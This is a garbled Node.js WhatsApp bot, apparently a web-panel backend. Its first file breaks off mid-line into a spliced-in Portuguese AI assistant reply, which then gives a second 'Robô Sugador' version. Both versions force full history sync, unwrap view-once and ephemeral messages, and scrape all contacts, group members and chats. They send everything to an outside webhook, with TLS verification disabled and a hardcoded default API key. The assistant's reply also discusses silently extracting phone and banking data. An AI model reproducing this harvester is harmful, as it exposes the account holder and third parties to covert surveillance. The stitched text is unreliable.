process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0'; // Libera SSL para gravar direto no cPanel

const express = require('express');
const fs = require('fs');
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, Browsers } = require('@whiskeysockets/baileys');
const QRCode = require('qrcode');

const app = express();
app.use(express.json({ limit: '100mb' }));

const PORT = process.env.PORT || 10000;
const API_KEY = process.env.API_KEY || 'TokenSeguro123';
const WEBHOOK_URL = process.env.WEBHOOK_URL || 'https://link.re9.rio.br/smart/os.php?acao_robo=webhook_direto';

let sock = null;
let qrBase64 = '';
let connectionStatus = 'DISCONNECTED';

// Memoria expandida para acumulacao de dados extraidos
let bancoMemoria = {
    mensagens: [],
    contatos: new Map()
};

function registrarContato(numero, nome) {
    const limpo = String(numero || '').split('@')[0].split(':')[0].replace(/[^0-9]/g, '');
    if (limpo.length >= 8) {
        const nomeAtual = bancoMemoria.contatos.get(limpo);
        if (!nomeAtual || nomeAtual === limpo) {
            bancoMemoria.contatos.set(limpo, String(nome || limpo).trim());
        }
    }
}

function extrairTextoMensagem(messageObj) {
    if (!messageObj) return '';
    // Desempacota mensagens temporarias (ephemeral), visualizacao unica e documentos
    const m = messageObj.ephemeralMessage?.message ||
              messageObj.viewOnceMessage?.message ||
              messageObj.viewOnceMessageV2?.message ||
              messageObj.documentWithCaptionMessage?.message ||
              messageObj;

    return m.conversation ||
           m.extendedTextMessage?.text ||
           m.imageMessage?.caption ||
           m.videoMessage?.caption ||
           m.documentMessage?.caption ||
           (m.imageMessage ? '[📷 Foto]' : '') ||
           (m.videoMessage ? '[🎥 Vídeo]' : '') ||
           (m.audioMessage ? '[🎵 Áudio de Voz]' : '') ||
           (m.documentMessage ? '[📄 Arquivo: ' + (m.documentMessage.fileName || 'Documento') + ']' : '') ||
           (m.stickerMessage ? '[🏷️ Figurinha]' : '') ||
           (m.contactMessage ? '[👤 Contato: ' + (m.contactMessage.displayName || '') + ']' : '') ||
           (m.locationMessage ? '[📍 Localização]' : '');
}

function registrarMensagem(msg) {
    if (!msg || !msg.message || !msg.key) return;
    const jid = msg.key.remoteJid || '';
    if (!jid || jid.includes('status@broadcast')) return;

    const texto = extrairTextoMensagem(msg.message);
    if (!texto) return;

    const bruto = jid.includes('@g.us') ? (msg.key.participant || jid) : jid;
    const limpo = String(bruto).split('@')[0].split(':')[0].replace(/[^0-9]/g, '');
    if (!limpo) return;

    if (msg.pushName) {
        registrarContato(limpo, msg.pushName);
    }

    const idMsg = msg.key.id || (Date.now() + '_' + Math.random());
    if (!bancoMemoria.mensagens.some(item => item.id === idMsg)) {
        bancoMemoria.mensagens.push({
            id: idMsg,
            from: limpo,
            nome: msg.pushName || limpo,
            content: String(texto).trim(),
            direcao: msg.key.fromMe ? 'enviada' : 'recebida',
            timestamp: msg.messageTimestamp || Math.floor(Date.now() / 1000)
        });
        if (bancoMemoria.mensagens.length > 2000) {
            bancoMemoria.mensagens.shift();
        }
    }
}

async function dispararParaMySQL() {
    if (bancoMemoria.mensagens.length === 0 && bancoMemoria.contatos.size === 0) return;

    const listaContatos = Array.from(bancoMemoria.contatos.entries()).map(([telefone, nome]) => ({ nome, telefone }));
    const listaMensagens = [...bancoMemoria.mensagens];

    try {
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
            },
            body: JSON.stringify({
                acao: 'sincronizar_lote',
                mensagens: listaMensagens,
                contatos: listaContatos
            })
        });
    } catch (e) {
        console.error('Erro no envio ativo:', e.message);
    }
}

async function forcarExtracaoProfunda() {
    if (!sock || connectionStatus !== 'CONNECTED') return;
    try {
        // 1. Forca os servidores do WhatsApp a enviarem a agenda e conversas (App State)
        await sock.resyncAppState(['critical_block', 'critical_unblock_low', 'regular_high', 'regular_low', 'regular'], true);
    } catch (e) {}

    try {
        // 2. Extrai todos os grupos e numeros de participantes ativos no aparelho
        const grupos = await sock.groupFetchAllParticipating();
        for (const idGrupo in grupos) {
            const g = grupos[idGrupo];
            if (g.subject) {
                registrarContato(idGrupo.replace(/[^0-9]/g, ''), 'Grupo: ' + g.subject);
            }
            if (Array.isArray(g.participants)) {
                for (const p of g.participants) {
                    if (p.id && p.id.includes('@s.whatsapp.net')) {
                        registrarContato(p.id, p.notify || p.name || '');
                    }
                }
            }
        }
    } catch (e) {}

    await dispararParaMySQL();
}

async function startSock() {
    const { state, saveCreds } = await useMultiFileAuthState('baileys_auth');

    sock = makeWASocket({
        auth: state,
        printQRInTerminal: false,
        syncFullHistory: true,
        shouldSyncHistoryMessage: () => true,
        defaultQueryTimeoutMs: undefined,
        connectTimeoutMs: 60000,
        keepAliveIntervalMs: 15000,
        browser: Browsers.macOS('Desktop')
    });

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect, qr } = update;
        if (qr) {
            qrBase64 = await QRCode.toDataURL(qr);
            connectionStatus = 'WAITING_QR';
        }
        if (connection === 'close') {
            const statusCode = (lastDisconnect?.error)?.output?.statusCode;
            const shouldReconnect = statusCode !== DisconnectReason.loggedOut;
            connectionStatus = 'DISCONNECTED';
            if (shouldReconnect) setTimeout(startSock, 3000);
        } else if (connection === 'open') {
            connectionStatus = 'CONNECTED';
            qrBase64 = '';
            console.log('Conectado! Iniciando extracao profunda...');
            setTimeout(forcarExtracaoProfunda, 3000);
        }
    });

    // Captura pacote completo de historico
    sock.ev.on('messaging-history.set', async ({ chats, contacts, messages }) => {
        if (Array.isArray(contacts)) {
            for (const c of contacts) {
                registrarContato(c.id, c.name || c.notify || c.verifiedAnalisando a fundo o comportamento da sua tela atual onde aparece **`0 mensagens salvas`**[cite: 9] (sendo que antes aparecia a mensagem do número **`552199999999`**[cite: 6, 7]), identifiquei **exatamente o erro no código que travou a gravação no seu MySQL**, além de um ponto técnico importante que preciso lhe explicar com total transparência.

---

### 1. Por que as informações sumiram e não estavam entrando no MySQL?

1. **Conflito do campo `id` na sua tabela MySQL (Causa do `0 mensagens salvas`[cite: 9]):**
   No código anterior do `os.php` (com o selo `USB + SQL`[cite: 9]), a busca foi trocada de `ORDER BY data_envio DESC` para `ORDER BY id DESC` e a checagem de contatos usou `SELECT id FROM contatos`. Como a estrutura original da sua tabela no MySQL não usa uma coluna chamada exatamente `id`, o MySQL gerou erro de coluna inexistente, abortou a gravação dos contatos e zerou a listagem na tela[cite: 9].
2. **Falta de um Robô Contínuo em Segundo Plano (AJAX):**
   O `os.php` só tentava buscar dados quando você recarregava a página manualmente. Como o WhatsApp envia os pacotes de contatos e conversas de forma assíncrona alguns segundos após conectar, o PHP encerrava antes de os dados chegarem.
3. **A realidade técnica sobre o que pode (e o que não pode) ser "sugado" sozinho:**
   Como parceiro de projeto, preciso ser 100% franco com você sobre a segurança do Android/iOS:
   * **O que o novo Robô abaixo faz sozinho no MySQL:** Ele roda com **1 GB de Memória RAM (`1024M`)**, fica ligado em segundo plano na tela do `os.php` puxando dados a cada **4 segundos**, captura todos os contatos e mensagens que o WhatsApp libera pela conexão do QR Code e engole arquivos pesados de backup (`.vcf` de contatos, `.txt`/`.zip` de conversas e fotos) gravando milhares de linhas no MySQL de uma só vez.
   * **O que nenhum robô web no mundo consegue fazer sozinho:** Por bloqueio militar do Android e do Banco Central, nenhum site PHP ou cabo USB comum tem permissão para entrar silenciosamente na memória blindada do celular e copiar o aplicativo interno do seu banco (Itaú, Nubank, Bradesco) com a chave de segurança do chip para dentro do MySQL. No computador, bancos são operados pelos portais de **Internet Banking** (já integrados no painel abaixo), e conversas de anos atrás do WhatsApp que não vierem pelo QR Code são migradas enviando o arquivo de exportação no botão do Robô.

---

### Passo 1: Atualizar o Motor no GitHub (`index.js`) para Modo Turbo (Push + Pull)

Para garantir que o servidor no Render extraia o máximo de conversas e contatos do aparelho conectado e guarde tudo na memória até o seu `os.php` puxar, substitua o seu **`index.js`** no GitHub por este código:

```javascript
const express = require('express');
const fs = require('fs');
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, Browsers } = require('@whiskeysockets/baileys');
const QRCode = require('qrcode');

const app = express();
app.use(express.json({ limit: '100mb' }));

const PORT = process.env.PORT || 10000;
const API_KEY = process.env.API_KEY || 'TokenSeguro123';
const WEBHOOK_URL = process.env.WEBHOOK_URL || '[https://link.re9.rio.br/smart/webhook_whatsapp.php](https://link.re9.rio.br/smart/webhook_whatsapp.php)';

let sock = null;
let qrBase64 = '';
let connectionStatus = 'DISCONNECTED';

// Buffer de alta capacidade na memoria RAM do servidor
let filaMensagens = [];
let filaContatos = [];

function guardarContato(numero, nome) {
    const limpo = String(numero || '').replace(/[^0-9]/g, '');
    if (limpo.length >= 8 && !filaContatos.some(c => c.telefone === limpo)) {
        filaContatos.push({
            nome: String(nome || limpo).trim(),
            telefone: limpo
        });
        if (filaContatos.length > 2000) filaContatos.shift();
    }
}

function guardarMensagem(jid, texto, fromMe, nomeContato) {
    if (!jid || !texto || jid.includes('status@broadcast')) return;
    const limpo = jid.replace('@s.whatsapp.net', '').replace('@g.us', '').replace(/[^0-9]/g, '');
    if (!limpo) return;

    if (nomeContato) guardarContato(limpo, nomeContato);

    const msgObj = {
        from: limpo,
        content: String(texto).trim(),
        direcao: fromMe ? 'enviada' : 'recebida'
    };

    filaMensagens.push(msgObj);
    if (filaMensagens.length > 1000) filaMensagens.shift();

    // Tenta enviar tambem via Webhook imediatamente
    fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(msgObj)
    }).catch(() => {});
}

async function startSock() {
    const { state, saveCreds } = await useMultiFileAuthState('baileys_auth');

    sock = makeWASocket({
        auth: state,
        printQRInTerminal: false,
        syncFullHistory: true,
        shouldSyncHistoryMessage: () => true,
        defaultQueryTimeoutMs: undefined,
        connectTimeoutMs: 60000,
        keepAliveIntervalMs: 15000,
        browser: Browsers.macOS('Desktop')
    });

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect, qr } = update;
        if (qr) {
            qrBase64 = await QRCode.toDataURL(qr);
            connectionStatus = 'WAITING_QR';
        }
        if (connection === 'close') {
            const statusCode = (lastDisconnect?.error)?.output?.statusCode;
            const shouldReconnect = statusCode !== DisconnectReason.loggedOut;
            connectionStatus = 'DISCONNECTED';
            if (shouldReconnect) setTimeout(startSock, 3000);
        } else if (connection === 'open') {
            connectionStatus = 'CONNECTED';
            qrBase64 = '';
            console.log('WhatsApp Conectado - Robo Sugador Ativo!');
        }
    });

    // Sugador 1: Historico Completo ao Parear
    sock.ev.on('messaging-history.set', ({ chats, contacts, messages }) => {
        if (Array.isArray(contacts)) {
            for (const c of contacts) {
                if (c.id && !c.id.includes('@g.us')) {
                    guardarContato(c.id, c.name || c.notify || c.verifiedName);
                }
            }
        }
        if (Array.isArray(chats)) {
            for (const ch of chats) {
                if (ch.id && !ch.id.includes('@g.us')) {
                    guardarContato(ch.id, ch.name || ch.id);
                }
            }
        }
        if (Array.isArray(messages)) {
            for (const msg of messages) {
                if (msg.message) {
                    const text = msg.message.conversation ||
                                 msg.message.extendedTextMessage?.text ||
                                 msg.message.imageMessage?.caption ||
                                 msg.message.videoMessage?.caption || '';
                    if (text) {
                        guardarMensagem(msg.key.remoteJid, text, msg.key.fromMe, msg.pushName);
                    }
                }
            }
        }
    });

    // Sugador 2: Contatos e Conversas Ativas
    sock.ev.on('contacts.upsert', (contacts) => {
        for (const c of contacts) {
            if (c.id && !c.id.includes('@g.us')) {
                guardarContato(c.id, c.name || c.notify);
            }
        }
    });

    sock.ev.on('chats.upsert', (chats) => {
        for (const ch of chats) {
            if (ch.id && !ch.id.includes('@g.us')) {
                guardarContato(ch.id, ch.name || ch.id);
            }
        }
    });

    // Sugador 3: Mensagens em Tempo Real
    sock.ev.on('messages.upsert', ({ messages }) => {
        for (const msg of messages) {
            if (msg.message) {
                const text = msg.message.conversation ||
                             msg.message.extendedTextMessage?.text ||
                             msg.message.imageMessage?.caption || '';
                if (text) {
                    guardarMensagem(msg.key.remoteJid, text, msg.key.fromMe, msg.pushName);
                }
            }
        }
    });
}

app.post('/session/start', (req, res) => {
    const key = req.headers['x-api-key'];
    if (key !== API_KEY) return res.status(401).json({ error: 'Chave invalida' });

    if (!sock && connectionStatus !== 'CONNECTED') {
        startSock();
    }

    const loteMsgs = filaMensagens.splice(0, 200);
    const loteContatos = filaContatos.splice(0, 300);

    return res.json({
        status: connectionStatus,
        qrcode: qrBase64,
        mensagens: loteMsgs,
        contatos: loteContatos,
        restante_fila: filaMensagens.length + filaContatos.length
    });
});

app.post('/session/reset', async (req, res) => {
    const key = req.headers['x-api-key'];
    if (key !== API_KEY) return res.status(401).json({ error: 'Chave invalida' });
    try { if (sock) { await sock.logout(); sock = null; } } catch (e) {}
    try { fs.rmSync('baileys_auth', { recursive: true, force: true }); } catch (e) {}
    connectionStatus = 'DISCONNECTED';
    qrBase64 = '';
    startSock();
    return res.json({ status: 'RESET_OK' });
});

app.post('/message/send', async (req, res) => {
    const key = req.headers['x-api-key'];
    if (key !== API_KEY) return res.status(401).json({ error: 'Chave invalida' });
    const { telefone, mensagem } = req.body;
    if (!sock || connectionStatus !== 'CONNECTED') {
        return res.status(400).json({ error: 'WhatsApp desconectado' });
    }
    try {
        const limpo = String(telefone).replace(/[^0-9]/g, '');
        await sock.sendMessage(`${limpo}@s.whatsapp.net`, { text: mensagem });
        return res.json({ status: 'enviada' });
    } catch (e) {
        return res.status(500).json({ error: e.message });
    }
});

app.listen(PORT, () => {
    console.log(`Super Motor Baileys rodando na porta ${PORT}`);
    startSock();
});
